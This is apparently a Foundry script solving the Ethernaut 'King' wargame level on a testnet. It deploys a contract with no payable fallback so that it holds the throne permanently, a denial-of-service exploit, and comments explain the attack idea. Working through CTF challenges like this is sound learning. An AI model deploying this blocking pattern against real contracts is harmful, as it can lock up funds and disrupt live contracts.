// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {King} from "../src/King.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/King.s.sol --tc KingSolution --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv --verify

contract KingSolution is Script {

    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = (vm.envAddress("KING_INSTANCE"));

    /* Attack idea:
    Notice that who ever become the new king by passing more than 0.01 ether is the new king
    we can design a contract that sends to this and become the new king, that does not have receive neither fallback function
    So if the msg.value is higher it will revert anyways when calling transfer when someone tries to become the new king
    Notice that it will send to the old king the value that we put as msg.value (to the level address)
    */
    function run() external {

        uint256 prize = King(payable(instance)).prize();
        vm.startBroadcast(deployerPrivateKey);
        // create the attack contract
        kingForEver attackContract = new kingForEver(instance);
        // call the attack function of the attack contract with 1 ether + 1 wei
        attackContract.attack{value: prize + 1}();
        vm.stopBroadcast();
    }
}

contract kingForEver {
    address public kingInstance;

    constructor(address _kingInstance) {
        kingInstance = _kingInstance;
    }

    // We could also make a receive payable function that just revert intensionally
    /*
    receive() external payable {
        revert("I am the king");
    */

    function attack() public payable {
        // send the value to the king contract with call to become the new king
        // notice that we can't use transfer because it will revert for exceeding 2300 gas
        (bool success, ) = payable(kingInstance).call{value: msg.value}("");
    }

}